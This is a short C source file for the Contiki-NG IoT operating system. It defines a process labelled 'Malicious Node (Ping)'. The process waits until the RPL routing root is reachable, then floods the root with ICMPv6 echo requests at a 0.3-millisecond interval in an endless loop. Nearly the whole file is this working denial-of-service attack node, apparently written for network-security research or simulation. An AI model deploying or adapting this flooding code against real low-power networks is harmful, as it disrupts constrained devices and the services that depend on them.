
/**
 * @file malnodeping.c
 * @author Ghozlan
 * @brief 
 * @version 0.1
 * @date 2021-05-27
 * 
 * @copyright Copyright (c) 2021
 * 
 */
#include "contiki.h"
#include "net/routing/routing.h"
#include "net/netstack.h"
#include "net/ipv6/uip-icmp6.h"
#include "net/routing/rpl-classic/rpl-private.h"
#include "sys/log.h"
#include "random.h"

/**
 * @brief Logging macros
 * 
 */
#define LOG_MODULE "malNodePing"
#define LOG_LEVEL LOG_LEVEL_INFO

/**
 * @brief Server configuration macros
 * 
 */
#define SEND_INTERVAL (0.0003 * CLOCK_SECOND)

PROCESS(mal_node_ping_proc, "Malicious Node (Ping)");
AUTOSTART_PROCESSES(&mal_node_ping_proc);

/**
 * @brief Construct a new process thread object
 * 
 */
PROCESS_THREAD(mal_node_ping_proc, ev, data)
{
    static struct etimer timer;
    static uip_ipaddr_t dstIP;
    static unsigned int count;
    PROCESS_BEGIN();
    etimer_set(&timer, SEND_INTERVAL);
    while(1) {
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
        etimer_reset(&timer);
        if(NETSTACK_ROUTING.node_is_reachable() &&
        NETSTACK_ROUTING.get_root_ipaddr(&dstIP))
            break;
    }

    while(1) {

        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
        uip_icmp6_send(&dstIP, ICMP6_ECHO_REQUEST, RPL_CODE_DIS, 33); 
        LOG_INFO("[*]Ping #%u to ", count++);
        LOG_INFO_6ADDR(&dstIP);
        LOG_INFO("\n");
        etimer_reset(&timer);
    }
    PROCESS_END();
}